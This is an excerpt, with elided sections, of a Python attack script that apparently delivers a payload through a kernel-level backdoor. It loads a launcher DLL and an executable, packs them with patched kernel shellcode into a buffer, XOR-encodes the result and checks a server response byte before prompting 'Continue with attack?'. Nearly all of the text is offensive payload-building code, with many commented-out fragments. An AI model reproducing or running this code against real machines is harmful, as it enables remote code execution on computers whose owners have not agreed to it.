...
FILE_LOCATION = "E:\\TEMP\\putty.exe"
LAUNCHER_DLL_LOCATION = "E:\\TEMP\\launcher_dll.bin"
...
def read_launcher_file_as_hex():
    global launcher_hex
    print("reading launcher DLL into memory!")
    with open(LAUNCHER_DLL_LOCATION, "rb") as f:
        data = f.read()
        launcher_hex = binascii.hexlify(data)
...
if __name__ == "__main__":
    ...
    if final_response[34] == 81:
        ...
        answer = input("Continue with attack? (y/n): ").strip().lower()
        ...
        EntireDLLSize = dll_size
        # EntirePayloadSize = len(hex_bytes) + 6144
        EntirePayloadSize = dll_size + 6144
        ...
        print("patched all kernel shellcode values!")

        EXE_SIZE_OFFSET = 0xC8A4
        SIZE_FIELD_LEN = 4
        DllPayload = bytearray(dll_size)
        DllPayload[0: 0 + EXE_SIZE_OFFSET] = bytearray_launcher_dll
        #DllPayload[0:0xC8A4] = bytearray_launcher_dll
        print("copied launcher dll to payload buffer")

        ExeSizeOffset = 0xC8A4
        ExeOffset = 0xC8A4 + 4

        bytes_exe_size = struct.pack('<I', exesize)
        DllPayload[EXE_SIZE_OFFSET: EXE_SIZE_OFFSET + 4] = bytes_exe_size
        print("Copied exe size to payload buffer")

        exe_data_offset = 0xC8A4 + 4
        exe_len = len(bytearray_exe_bytes)
        end_offset = exe_data_offset + exe_len

        DllPayload[exe_data_offset: end_offset] = bytearray_exe_bytes


        #total_exe_size = struct.pack('<I', len(bytearray_exe_bytes))
        #DllPayload[ExeOffset:] = total_exe_size
        # bytearray_total_exe_size = bytearray(total_exe_size)
        # DllPayload += bytearray_total_exe_size
        # DllPayload[ExeOffset: ExeOffset + exesize] = bytearray_exe_bytes
        #DllPayload += bytearray_exe_bytes
        #DllPayload[ExeOffset:bytearray_exe_bytes_len] = bytearray_exe_bytes
        #DllPayload += bytearray_exe_bytes

        #exe_data_offset = EXE_SIZE_OFFSET + SIZE_FIELD_LEN
        #end_offset = exe_data_offset + len(bytearray_exe_bytes)
        #DllPayload[ExeOffset:] = exe_bytes
        print("copied exe to the payload buffer")

        '''
        DllPayload += bytearray_launcher_dll
        DllPayload
        total_exe_size = struct.pack('<I', exesize)
        #DllPayload[ExeSizeOffset: ExeSizeOffset + 4] = total_exe_size
        bytearray_total_exe_size = bytearray(total_exe_size)
        DllPayload += bytearray_total_exe_size
        #DllPayload[ExeOffset : ExeOffset  + 4] = bytearray_exe_bytes
        DllPayload += bytearray_exe_bytes
    
        '''

        '''
        DLLChunk = b''.join([xor_bytes[Offset: Offset + 4096]])
        ExeLengthChunk = b''.join([xor_bytes[Offset: Offset + 4096]])
        ExeChunk = b''.join([xor_bytes[Offset: Offset + 4096]])
        '''


        TotalPayload = bytearray()
        TotalPayload += bytearray_rundll_kernel_shellcode
        TotalPayload += DllPayload
        xor_bytes = byte_xor(TotalPayload, key)
        print("XORing payload buffer")
        ...
        if remainder > 0:
            ...
            print(hexdump(last_xor_parameters))
